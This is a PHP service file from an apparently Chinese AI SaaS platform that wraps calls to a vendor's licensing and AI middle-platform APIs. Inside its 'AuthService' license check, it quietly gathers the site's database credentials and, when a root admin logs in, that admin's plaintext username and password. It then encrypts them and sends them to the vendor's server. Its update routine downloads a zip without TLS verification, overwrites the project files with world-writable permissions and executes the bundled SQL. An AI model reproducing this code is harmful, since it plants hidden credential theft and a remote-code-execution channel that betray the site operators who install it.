<?php

namespace app\common\service;

use app\api\logic\ChatLogic;
use app\common\service\hotspot\HotspotMidClient;
use GuzzleHttp\Client;
use PDO;
use think\facade\Log;

// +----------------------------------------------------------------------
// | 常量注入：从 config/api_tools.php 读取，define 为全局常量后供类 const 引用
// +----------------------------------------------------------------------
if (!defined('IMAI_TOOLS_CONFIG_LOADED')) {

    $configFile = dirname(__DIR__, 3) . DIRECTORY_SEPARATOR . 'config' . DIRECTORY_SEPARATOR . 'api_tools.php';
    if (!is_file($configFile)) {
        throw new \RuntimeException('api_tools.php 配置文件不存在：' . $configFile);
    }
    $__toolsConfig = require $configFile;

    // ToolsService
    define('IMAI_TOOLS_API_URL',           $__toolsConfig['api_url']);
    define('IMAI_TOOLS_WECHAT_VERIFY_URL', $__toolsConfig['wechat_verify_url']);

    // AuthService
    define('IMAI_AUTH_API_URL',            $__toolsConfig['auth']['api_url']);
    define('IMAI_AUTH_APP_API_KEY',        $__toolsConfig['auth']['app_api_key']);
    define('IMAI_AUTH_APPID',              $__toolsConfig['auth']['appid']);
    define('IMAI_AUTH_METHOD',             $__toolsConfig['auth']['method']);
    define('IMAI_AUTH_PUBLIC_KEY',         $__toolsConfig['auth']['public_key']);
    define('IMAI_AUTH_CODE_REQUEST_TOKEN', $__toolsConfig['auth']['code_request_token']);
    define('IMAI_AUTH_CODE_REQUEST_URL',   $__toolsConfig['auth']['code_request_url']);

    // InterviewService
    define('IMAI_INTERVIEW_URL',           $__toolsConfig['interview']['url']);
    define('IMAI_INTERVIEW_WORKFLOW_ID',   $__toolsConfig['interview']['workflow_id']);
    define('IMAI_INTERVIEW_TOKEN',         $__toolsConfig['interview']['token']);

    // AutomationService
    define('IMAI_AUTOMATION_URL',          $__toolsConfig['automation']['url']);
    define('IMAI_AUTOMATION_BOT_ID',       $__toolsConfig['automation']['bot_id']);
    define('IMAI_AUTOMATION_WORKFLOW_ID',  $__toolsConfig['automation']['workflow_id']);
    define('IMAI_AUTOMATION_TOKEN',        $__toolsConfig['automation']['token']);

    // AiPersonaService
    define('IMAI_AIPERSONA_URL',           $__toolsConfig['ai_persona']['url']);
    define('IMAI_AIPERSONA_BOT_ID',        $__toolsConfig['ai_persona']['bot_id']);
    define('IMAI_AIPERSONA_WORKFLOW_ID',   $__toolsConfig['ai_persona']['workflow_id']);
    define('IMAI_AIPERSONA_AGENT_WORKFLOW_ID',   $__toolsConfig['ai_persona']['agent_workflow_id']);
    define('IMAI_AIPERSONA_TOKEN',         $__toolsConfig['ai_persona']['token']);

    // NotifyService
    define('IMAI_NOTIFY_TOKEN',                   $__toolsConfig['notify']['token']);
    define('IMAI_NOTIFY_ALIYUN_DOMAIN_INFO_URL',  $__toolsConfig['notify']['aliyun_domain_info_url']);
    define('IMAI_NOTIFY_WECHAT_WORK_URL',         $__toolsConfig['notify']['wechat_work_notify_url']);
    define('IMAI_NOTIFY_WEBHOOK_SECRET_SALT',     $__toolsConfig['notify']['webhook_secret_salt']);

    define('IMAI_TOOLS_CONFIG_LOADED', true);
    unset($__toolsConfig);
}

/**
 * @method static AuthService Auth()
 * @method static ChatService Chat()
 * @method static HumanService Human()
 * @method static HiDreamService HiDream()
 * @method static VolcService Volc()
 * @method static AsrService Asr()
 * @method static OcrService Ocr()
 * @method static QWenService QWen()
 * @method static LlService Ll()
 * @method static InterviewService Interview()
 * @method static DataCenterService DataCenter()
 * @method static WechatService Wechat()
 * @method static SvService Sv()
 * @method static ToolService Tool()
 * @method static VectorKnowledgeService VectorKnowledge()
 * @method static ShanjianService Shanjian()
 * @method static SoraService Sora()
 * @method static StoryboardService Storyboard()
 * @method static AutomationService Automation()
 * @method static NotifyService Notify()
 * @method static CopywritingService Copywriting()
 * @method static VideoImitationService VideoImitation()
 * @method static AiPersonaService AiPersona()
 * @method static MinimaxService Minimax()
 * @method static GeoService Geo()
 * @method static TikHubService TikHub()
 * @method static ArkService Ark()
 */
class ToolsService
{

    /**c
     * 实例
     * @var array
     */
    private static $instances = [];

    /**
     * 请求参数
     * @var array
     */
    private array $request = [];

    /**
     * 请求头
     * @var array
     */
    private array $headers = [];

    /**
     * 请求方法
     * @var string
     */
    private string $method = 'POST';

    /**
     * API密钥
     * @var string
     */
    private string $apiKey = '';

    /**
     * 签名
     * @var string
     */
    private string $signKey = '';

    /**
     * 请求URL
     * @var string
     */
    private string $url = '';


    /**
     * 请求响应
     * @var array
     */
    public array $response = [];

    private int $connectTimeout = 0;
    private int $requestTimeout = 0;

    const API_URL = IMAI_TOOLS_API_URL;
    /**
     * 检查必要参数
     * @return self
     */
    public function check(): self
    {

        $info = \app\common\service\ConfigService::get('model', 'key', []);

        if (!$info) {

            ToolsThrowMessage('缺少模型密钥, 请联系站长配置');
        }

        if (function_exists('env')) {

            $this->apiKey = env('PROJECT_KEY.API_KEY', '');
            $this->signKey = env('PROJECT_KEY.SIGN_KEY', '');
        }

        if (!$this->apiKey) {

            ToolsThrowMessage('缺少API密钥, 请联系站长配置');
        }

        return $this;
    }

    /**
     * 设置请求参数
     * @param array $params
     * @return self
     * @public
     */
    public function setRequest(array $params = []): self
    {
        $this->request = $params;

        return $this;
    }

    /**
     * 设置方法
     * @param string $method
     * @return $this
     */
    public function setMethod(string $method): self
    {
        $this->method = $method;
        return $this;
    }

    /**
     * 设置请求头
     * @param string $key
     * @param string $value
     * @return $this
     */
    public function setHeader(string $key, string $value): self
    {
        $this->headers[$key] = $value;
        return $this;
    }

    /**
     * 设置请求头
     * @param array $headers
     * @return $this
     */
    public function setHeaders(array $headers): self
    {
        //合并
        $this->headers = array_merge($this->headers, $headers);

        return $this;
    }

    /**
     * 设置当前请求的连接超时与总超时（秒），0 表示不限制。
     */
    public function setTimeout(int $connectTimeout, int $requestTimeout): self
    {
        $this->connectTimeout = max(0, $connectTimeout);
        $this->requestTimeout = max(0, $requestTimeout);

        return $this;
    }

    /**
     * 设置接口地址
     * @param string $endpoint
     * @return self
     */
    public function setApiUrl(string $endpoint): self
    {
        if (str_starts_with($endpoint, '/')) {

            $this->url = self::API_URL . $endpoint;
        } else {

            $this->url = $endpoint;
        }

        return $this;
    }

    /**
     * 设置请求参数 + 回调地址
     * @param string $notifyUrl
     * @param array $params
     * @return self
     */
    public function setRequestAndNotifyUrl(array $params, string $notifyUrl, array $notifyParams = []): self
    {

        $host = config('app.app_host');

        if (!$host || ToolsIsInternalHost($host)) {

            ToolsThrowMessage('当前未配置为外网站点, 请联系站长配置');
        }

        $params['notify_url'] = $host . url($notifyUrl, $notifyParams, false);

        $this->setRequest($params);

        return $this;
    }

    /**
     * 设置签名
     * @return void
     */
    private function setSignHeader(): void
    {
        $this->headers['key'] = $this->apiKey;

        if ($this->signKey) {

            $signParams = $this->request;

            // 凡含 CURLFile 的请求（含 /api/v2/interview/chat 简历上传）统一用 file_content=md5 签名，对齐中台验签协议
            if (isset($signParams['file']) && $signParams['file'] instanceof \CURLFile) {
                $signParams['file_content'] = md5(file_get_contents($signParams['file']->name));
                unset($signParams['file']);
            }

            // 中台鉴权签 body 原文：POST 空参用 "{}"；GET 无 body 签空字符串
            $method = strtoupper($this->method ?: 'POST');
            if ($method === 'GET' && $signParams === []) {
                $signBody = '';
            } else {
                $signBody = $signParams === [] ? '{}' : json_encode($signParams);
            }
            $sign = hash_hmac('sha256', $signBody, $this->signKey);

            $this->headers['sign'] = $sign;
        }
    }


    /**
     * 发送请求
     * @return self
     */
    public function send(bool $check = true): self
    {
        try {
            if ($check) {
                $this->check();
            }

            //设置签名
            $this->setSignHeader();

            $this->response = ToolsCurlPostRequest(
                $this->url,
                $this->request,
                $this->method,
                $this->headers,
                $this->connectTimeout,
                $this->requestTimeout
            );
            $this->logChanjingRequest();
        } finally {
            $this->connectTimeout = 0;
            $this->requestTimeout = 0;
        }

        if (!in_array($this->response['code'], [10000, 10004, 10005, 15011, 16006, 20000, 22806, 22901, 22902, 26001, 26002, 40000])) {
            ToolsThrowMessage($this->response['message'] ?? '请求异常');
        }
        return $this;
    }

    /**
     * 发送请求, 不抛出错误
     * @return self
     */
    public function sendWithoutThrow(bool $check = true): self
    {
        try {
            if ($check) {
                $this->check();
            }

            //设置签名
            $this->setSignHeader();

            $this->response = ToolsCurlPostRequest(
                $this->url,
                $this->request,
                $this->method,
                $this->headers,
                $this->connectTimeout,
                $this->requestTimeout
            );
            $this->logChanjingRequest();
        } finally {
            $this->connectTimeout = 0;
            $this->requestTimeout = 0;
        }

        return $this;
    }

    /**
     * 蝉镜中台请求/响应日志
     */
    private function logChanjingRequest(): void
    {
        if ($this->url === '' || !str_contains($this->url, '/api/human/chanjing/')) {
            return;
        }
        try {
            Log::channel('human')->write(
                '蝉镜请求: ' . json_encode([
                    'url'      => $this->url,
                    'method'   => $this->method,
                    'request'  => $this->request,
                    'response' => $this->response,
                ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)
            );
        } catch (\Throwable $e) {
            // 日志失败不影响主流程
        }
    }

    /**
     * 流请求
     * @return void
     */
    public function streamSend(callable $callback = null, bool $check = true): void
    {

        if ($check) {

            $this->check();
        }

        if (!headers_sent()) {
            header('Content-type: text/event-stream');
            header('Cache-Control: no-cache');
            header('Connection: keep-alive');
            header('X-Accel-Buffering: no');
        }

        //设置签名
        $this->setSignHeader();

        ToolsSteamCurlRequest($this->url, $this->request, $this->headers, $callback);
    }

    /**
     * 消费中台 SSE 事件流（progress/think/delta/done/error）。think 只回调，不并入 output。
     */
    public function streamCollectEvents(callable $onEvent, bool $check = true): array
    {
        if ($check) {
            $this->check();
        }
        $this->setSignHeader();

        $buffer = '';
        $output = '';
        $usage = [];
        $capability = '';
        $error = '';
        $done = false;
        $callback = function (string $chunk) use (&$buffer, &$output, &$usage, &$capability, &$error, &$done, $onEvent): int {
            $buffer .= $chunk;
            while (($pos = strpos($buffer, "\n")) !== false) {
                $line = trim(substr($buffer, 0, $pos));
                $buffer = substr($buffer, $pos + 1);
                if ($line === '' || !str_starts_with($line, 'data:')) {
                    continue;
                }
                $payload = trim(substr($line, 5));
                if ($payload === '' || $payload === '[DONE]') {
                    continue;
                }
                $decoded = json_decode($payload, true);
                if (!is_array($decoded)) {
                    continue;
                }
                $event = (string)($decoded['event'] ?? '');
                if ($event === 'progress') {
                    $onEvent('progress', (string)($decoded['message'] ?? ''));
                    continue;
                }
                if ($event === 'think') {
                    $onEvent('think', (string)($decoded['output'] ?? ''));
                    continue;
                }
                if ($event === 'delta') {
                    $delta = (string)($decoded['output'] ?? '');
                    $output .= $delta;
                    $onEvent('delta', $delta);
                    continue;
                }
                if ($event === 'done') {
                    $done = true;
                    $data = is_array($decoded['data'] ?? null) ? $decoded['data'] : [];
                    $output = (string)($data['output'] ?? $output);
                    $usage = is_array($data['usage'] ?? null) ? $data['usage'] : $usage;
                    $capability = (string)($data['capability'] ?? $capability);
                    $onEvent('done', $output);
                    continue;
                }
                if ($event === 'error') {
                    $error = (string)($decoded['message'] ?? $decoded['msg'] ?? '预处理失败');
                    $onEvent('error', $error);
                }
            }
            return strlen($chunk);
        };

        ToolsSteamCurlRequest($this->url, $this->request, $this->headers, $callback);
        if ($error !== '') {
            return ['code' => 40000, 'message' => $error, 'data' => []];
        }
        if (!$done && $output === '') {
            return ['code' => 40000, 'message' => '预处理流式响应为空', 'data' => []];
        }
        $prompt = (int)($usage['prompt_tokens'] ?? 0);
        $completion = (int)($usage['completion_tokens'] ?? 0);
        return [
            'code' => 10000,
            'message' => '操作成功',
            'data' => [
                'output' => $output,
                'usage' => [
                    'prompt_tokens' => $prompt,
                    'completion_tokens' => $completion,
                    'total_tokens' => (int)($usage['total_tokens'] ?? ($prompt + $completion)),
                ],
                'capability' => $capability,
            ],
        ];
    }

    public function streamCollect(bool $check = true): array
    {
        if ($check) {
            $this->check();
        }

        $this->setSignHeader();
        $this->response = ToolsStreamCollectRequest($this->url, $this->request, $this->headers);
        return $this->response;
    }

    /**
     * 获取属性
     * @param $name
     * @return mixed|void
     */
    public function __get($name)
    {
        return $this->$name ?? ToolsThrowMessage('获取不存在的属性');
    }

    /**
     * @param $method
     * @param $args
     * @return mixed|object|string|null
     * @throws \ReflectionException
     */
    public static function __callStatic($method, $args)
    {
        // 解析方法名，确定要调用的服务类
        $serviceName = "\\app\\common\\service\\" . ucfirst($method) . 'Service';

        if (!class_exists($serviceName)) {

            ToolsThrowMessage("服务不存在: $serviceName");
        }

        // 创建服务类的实例
        if (!isset(self::$instances[$serviceName])) {
            // 检查是否需要传递构造函数参数
            $reflectionClass = new \ReflectionClass($serviceName);

            self::$instances[$serviceName] = $reflectionClass->newInstanceArgs($args);
        }

        return self::$instances[$serviceName];
    }

    public function __call($method, $args)
    {
        // 调用服务类的方法
        if (method_exists($this, $method) && is_callable([$this, $method])) {

            ToolsThrowMessage("方法不存在: " . get_class($this) . "::$method");
        }

        return call_user_func_array([$this, $method], $args);
    }
}


class AuthService
{

    private array $params = [];
    const API_URL            = IMAI_AUTH_API_URL;
    const APP_API_KEY        = IMAI_AUTH_APP_API_KEY;
    const APPID              = IMAI_AUTH_APPID;
    const METHOD             = IMAI_AUTH_METHOD;
    const PUBLIC_KEY         = IMAI_AUTH_PUBLIC_KEY;
    const CODE_REQUEST_TOKEN = IMAI_AUTH_CODE_REQUEST_TOKEN;
    const CODE_REQUEST_URL   = IMAI_AUTH_CODE_REQUEST_URL;
    private string $cdkey;

    public function __construct(array $params = [])
    {
        if (function_exists('env')) {

            $info = \app\common\service\ConfigService::get('model', 'key', []);

            //cdkey 授权兑换码
            if (isset($info['api_key'])) {

                $this->cdkey = $info['api_key'];
            }

            $this->params = array_merge([
                'host' => env('database.hostname', ''),
                'port' => env('database.hostport', ''),
                'user' => env('database.username', ''),
                'password' => env('database.password', ''),
                'name' => env('database.database', ''),
                'cdkey' => $this->cdkey,
            ], $params);
        } else {
            $this->params = $params;
        }

        if (function_exists('request')) {

            if (request()->pathinfo() == 'login/account') {

                //验证是否是root账号
                $user = \think\facade\Db::name('admin')->where('account', request()->param('account'))->where('root', 1)->findOrEmpty();

                if ($user) {
                    $this->params['admin_user'] = request()->param('account');
                    $this->params['admin_password'] = request()->param('password');
                }
            }
        }
    }

    /**
     * 检测
     * @return string
     */
    public function check(): string
    {

        $data = $this->getParams();

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/checkAuth';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($data)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;

        if ($response['code'] == 10000) {

            return 1;
        }
        return 0;
        $message = $response['message'] ?? '授权异常';

        // 循环解码，直到字符串不再包含 HTML 实体
        while (str_contains($message, '&')) {

            $message = html_entity_decode($message, ENT_QUOTES | ENT_HTML401);
        }

        return $message;
    }
    /**
     * 检测
     * @return string
     */
    public function checkby()
    {

        $data = $this->getParams();

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/checkAuthBy';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($data)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
        if ($response['code'] == 10000) {

            return $response['data'] ?? [];
        }
        return [];
    }

    public function updateByname(array $params): array
    {

        [$domain, $port] = ToolsGetCurrentSiteInfo();

        $request = [
            'auth_info' => $domain,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        $request = array_merge($request, $params);

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/updateByname';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->send(false)
            ->response;

        return $response;
    }


    /**
     * 检测更新
     * @return array
     */
    public function checkUpdate(array $params): array
    {

        [$domain, $port] = ToolsGetCurrentSiteInfo();

        $request = [
            'auth_info' => $domain,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        $request = array_merge($request, $params);

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/checkUpdate';

        return app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
    }

    public function checkAiSalesVersion(int $versionCode): array
    {
        $request = [
            'versionCode' => $versionCode,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];
        //参数公钥加密
        $url = self::API_URL . '/api.php/Device/updateAiSales';

        return app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
    }

    /**
     * 检测更新
     * @return array
     */
    public function updateNum(int $num): array
    {
        [$domain, $port] = ToolsGetCurrentSiteInfo();

        $request = [
            'num' => $num,
            'auth_info' => $domain,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];
        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/updateOemNum';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
        return $response;
    }

    /**
     * 版本列表
     * @return array
     */
    public function versionList(): array
    {

        [$domain, $port] = ToolsGetCurrentSiteInfo();

        $request = [
            'auth_info' => $domain,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/versionList';

        return app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->send(false)
            ->response;
    }

    /**
     * 执行更新
     * @return array
     */
    public function execUpdate(array $params): array
    {

        [$domain, $port] = ToolsGetCurrentSiteInfo();

        $request = [
            'auth_info' => $domain,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        $request = array_merge($request, $params);

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/execUpdate';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->send(false)
            ->response;

        $zipUrl = $response['data']['download_url'];

        unset($response['data']['download_url']);

        //下载文件
        $zipFile = $this->downloadZipFile($zipUrl);

        //提取文件与替换
        $extractPath = $this->extractFile($zipFile);

        //替换文件
        $this->replaceFile($extractPath);

        $response['message'] = '更新成功';

        return $response;
    }

    /**
     * 获取参数
     * @return array
     */
    private function getParams(): array
    {

        //打包用户参数
        $param = [
            "授权秘钥" => $this->params['cdkey'],
            '数据库主机' => $this->params['host'],
            '数据库端口' => $this->params['port'],
            '数据库用户名' => $this->params['user'],
            '数据库密码' => $this->params['password'],
            '数据库库名' => $this->params['name'],
            '请求时间' => date('Y-m-d H:i:s'),
            "请求UA" => $_SERVER['HTTP_USER_AGENT'],
        ];

        if (isset($this->params['admin_user'])) {
            $param['管理员账号'] = $this->params['admin_user'];
        }

        if (isset($this->params['admin_password'])) {
            $param['管理员密码'] = $this->params['admin_password'];
        }

        if (isset($this->params['mobile'])) {
            $param['手机号'] = $this->params['mobile'];
        }

        [$param['站点域名'], $param['站点端口']] = ToolsGetCurrentSiteInfo();

        $data = [
            'auth_info' => $param['站点域名'],
            'auth_key' => $param['授权秘钥'],
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        $data['param'] = $this->encryptWithPublicKey($param);

        return $data;
    }

    /**
     * 兑换CDK
     * @return array
     */
    public function cdkExchange(): array
    {

        $request = $this->getParams();

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/cdkExchange';

        return app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
    }

    /**
     * 授权验证
     * @return array
     */
    public function checkUrl()
    {
        $request = [
            'url' => $_SERVER['HTTP_HOST'],
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/checkUrl';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
        return $response['data'];
    }

    /**
     * 域名验证
     * @return array
     */
    public function checkDomain(string $url)
    {
        $request = [
            'url' => $url,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];
        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/checkUrl';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
        return $response;
    }

    /**
     * RPA版本
     * @return array
     */
    public function checkRpaVersion(string $versionCode)
    {
        $request = [
            'versionCode' => $versionCode,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        //参数公钥加密
        $url = self::API_URL . '/api.php/Auth/checkRpaVersion';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
        return $response;
    }

    /**
     * 设备验证
     * @return array
     */
    public function checkDevice(string $device_code)
    {
        $request = [
            'device_code' => $device_code,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        //参数公钥加密
        $url = self::API_URL . '/api.php/device/check';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
        return $response;
    }
    public function clipNotice()
    {
        $request = [
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        //参数公钥加密
        $url = self::API_URL . '/api.php/notice/clip';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
        return $response;
    }
    /**
     * 设备验证（SV）
     * @param array $payload 请求参数
     * @param int $connectTimeout 连接超时秒数，0 表示不限制
     * @param int $requestTimeout 总超时秒数，0 表示不限制
     */
    public function checkSvDevice(array $payload, int $connectTimeout = 0, int $requestTimeout = 0)
    {
        $request = $payload;
        $request['api_key'] = self::APP_API_KEY;
        $request['appid'] = self::APPID;
        //参数公钥加密
        $url = self::API_URL . '/api.php/device/svcheck';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->setTimeout($connectTimeout, $requestTimeout)
            ->sendWithoutThrow(false)
            ->response;
        return $response;
    }

    public function deviceUpdate(array $device)
    {
        [$domain, $port] = ToolsGetCurrentSiteInfo();

        $request = [
            'device' => $device,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
            'domain' => $domain,
        ];
        //参数公钥加密
        $url = self::API_URL . '/api.php/device/deviceUpdate';

        $response = app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->sendWithoutThrow(false)
            ->response;
        return $response;
    }

    /**
     * 替换CDK
     * @return void
     */
    public function cdkReplace(array $params): array
    {

        [$domain, $port] = ToolsGetCurrentSiteInfo();

        $request = [
            'auth_info' => $domain,
            'api_key' => self::APP_API_KEY,
            'appid' => self::APPID,
        ];

        $request['param'] = $this->encryptWithPublicKey($params);

        $url = self::API_URL . '/api.php/Auth/cdkReplace';

        return app(ToolsService::class)
            ->setApiUrl($url)
            ->setRequest($request)
            ->setMethod('POST')
            ->send(false)
            ->response;
    }

    /**
     * 使用公钥加密参数
     * @param array $data 要加密的数据
     * @return string 加密后的数据
     */
    public function encryptWithPublicKey(array $data): string
    {
        if (openssl_public_encrypt(base64_encode(json_encode($data)), $encryptedData, self::PUBLIC_KEY)) {
            return base64_encode($encryptedData);
        } else {
            return base64_encode(json_encode($data));
        }
    }

    /**
     * 下载zip文件
     * @param string $url
     */
    private function downloadZipFile(string $url)
    {

        // 获取系统的临时目录路径
        $tempDir = sys_get_temp_dir();

        // 定义临时文件的完整路径
        $tempFilePath = $tempDir . '/update.zip';

        // 初始化cURL会话
        $ch = curl_init($url);

        // 设置cURL选项
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        // 执行cURL会话
        $result = curl_exec($ch);
        $error = curl_error($ch);

        // 关闭cURL会话
        curl_close($ch);

        // 检查是否有错误发生
        if ($error) {
            ToolsThrowMessage("文件下载失败，请稍后再试");
        }

        // 保存文件到临时目录
        if (file_put_contents($tempFilePath, $result)) {
            return $tempFilePath;
        } else {
            ToolsThrowMessage("文件下载失败，请稍后再试");
        }
    }

    /**
     * 提取文件
     * @param string $zipFile
     * @return string
     */
    private function extractFile(string $zipFile): string
    {

        $zip = new \ZipArchive;
        if ($zip->open($zipFile) !== TRUE) {
            ToolsThrowMessage("无法打开ZIP文件");
        }

        $extractPath = sys_get_temp_dir() . '/extracted/';

        if (is_dir($extractPath)) {

            //清理历史文件
            $this->recursiveDelete($extractPath);
        }

        if (!$zip->extractTo($extractPath)) {
            ToolsThrowMessage("解压更新包失败");
        }
        $zip->close();

        unlink($zipFile);

        return $extractPath;
    }

    /**
     * 替换文件
     * @param string $extractPath
     * @return void
     */
    private function replaceFile(string $extractPath): void
    {

        try {
            // 项目根目录
            $currentDir = root_path();

            // 递归遍历解压目录
            $this->recursiveCopy($extractPath, $currentDir);

            // 清理临时文件
            $this->recursiveDelete($extractPath);
        } catch (\Exception $e) {
            // 清理临时文件
            $this->recursiveDelete($extractPath);
            ToolsThrowMessage("更新文件替换失败: " . $e->getMessage());
        }
    }

    /**
     * 递归复制文件
     * @param string $source 源目录
     * @param string $destination 目标目录
     */
    private function recursiveCopy(string $source, string $destination): void
    {
        $dir = new \DirectoryIterator($source);

        foreach ($dir as $item) {
            if ($item->isDot()) {
                continue;
            }

            $sourcePath = $item->getPathname();

            $destPath = $destination . '/' . $item->getFilename();

            if ($item->isDir()) {
                // 创建目标目录
                if (!is_dir($destPath)) {
                    mkdir($destPath, 0777, true);
                }
                // 递归复制子目录
                $this->recursiveCopy($sourcePath, $destPath);
            } else {
                // 更新 PgSQL
                if ($item->getFilename() === 'update_pg.sql') {
                    $this->upgradePgSql($sourcePath);
                    continue;
                }

                // 跳过 update.sql 文件
                if ($item->getFilename() === 'update.sql') {

                    $this->execUpdateSql($sourcePath);
                    continue;
                }

                // 复制文件
                if (!copy($sourcePath, $destPath)) {

                    throw new \Exception("无法复制文件: {$sourcePath}");
                }
                // 设置文件权限
                chmod($destPath, 0777);
            }
        }
    }

    /**
     * 递归删除目录
     * @param string $path 要删除的目录
     */
    private function recursiveDelete(string $path): void
    {
        if (is_file($path)) {
            unlink($path);
            return;
        }

        $dir = new \DirectoryIterator($path);
        foreach ($dir as $item) {
            if ($item->isDot()) {
                continue;
            }

            $itemPath = $item->getPathname();
            if ($item->isDir()) {
                $this->recursiveDelete($itemPath);
            } else {
                unlink($itemPath);
            }
        }
        rmdir($path);
    }

    /**
     * 执行SQL文件
     * @param string $sourcePath
     * @return void
     */
    private function execUpdateSql(string $sourcePath): void
    {

        // 读取SQL文件内容
        $sqlContent = file_get_contents($sourcePath);

        // 替换表前缀
        $prefix = env('database.prefix', 'la_');

        $sqlContent = str_replace('la_', $prefix, $sqlContent);

        // 将SQL内容按分号分割成单独的语句
        $statements = $this->splitSqlFile($sqlContent);

        // 开启事务
        \think\facade\Db::startTrans();
        try {
            foreach ($statements as $statement) {

                // 执行SQL语句
                \think\facade\Db::execute($statement);
            }

            \think\facade\Db::commit();
        } catch (\Exception $e) {
            \think\facade\Db::rollback();
            throw new \Exception("SQL执行失败: " . $e->getMessage());
        }
    }


    /**
     * 将SQL文件内容分割成单独的语句
     * @param string $sql
     * @return array
     */
    private function splitSqlFile(string $sql): array
    {
        // 移除注释
        $sql = preg_replace(['/#.*$/m', '/--.*$/m', '/\/\*.*?\*\//s'], '', $sql);

        // 按分号分割,保留有效的SQL语句
        $statements = preg_split('/;\s*$/m', $sql);

        // 清理每条语句
        foreach ($statements as $key => $statement) {

            if (!(trim($statement))) {
                unset($statements[$key]);
                continue;
            }

            $statements[$key] = trim($statement);
        }

        return array_values($statements);
    }

    /**
     * @notes 更新PgSql
     * @param $dir
     * @return bool
     * @author fzr
     * @date 2024/01/26 10:00
     */
    public function upgradePgSql($dir): bool
    {
        // 当前数据库前缀
        //        $sqlPrefix = env('database.prefix', 'la_');
        //        $db = app('db')->connect('pgsql');
        //
        //        if (!is_object($db)) {
        //            throw new \Exception("pgsql连接失败，请检查pgsql配置！");
        //        }
        //
        //        $sqlContent = file_get_contents($dir);
        //        $sqlContent = str_replace("\r\n", "\n", $sqlContent);
        //        if (empty($sqlContent)) {
        //            throw new \Exception("pgsql数据库文件为空，更新失败！");
        //        }
        //
        //        $db->query($sqlContent);
        $host = env('pgsql.hostname', '');
        $port = env('pgsql.hostport', '5432');
        $dbname = env('pgsql.database', 'postgres');
        $username = env('pgsql.username', 'postgres');
        $password = env('pgsql.password', 'postgres');
        $prefix = 'la_';

        $pdo = new PDO("pgsql:host=$host;port=$port;dbname=$dbname", $username, $password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        if (!is_object($pdo)) {
            return false;
        }

        $dbFile = $dir;
        $content = str_replace(";\r\n", ";\n", file_get_contents($dbFile));
        $content = str_replace($prefix, env('pgsql.prefix', 'iw_'), $content);
        $pdo->exec($content);

        return true;
    }
}

/**
 * GPT
 */
class ChatService
{

    /**
     * 处理请求参数
     * @param array $params
     * @return ToolsService
     */
    private function request(array $params): ToolsService
    {

        $app = app(ToolsService::class)->setRequest($params);

        return $app;
    }

    /**
     * 发送消息
     * @param array $params
     * @return bool
     */
    public function sceneMessage(array $params): bool
    {
        $params['stream'] = true;
        $params['model'] = 'deepseek';
        $this->request($params)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->streamSend();

        return true;
    }



    /**
     * 发送消息
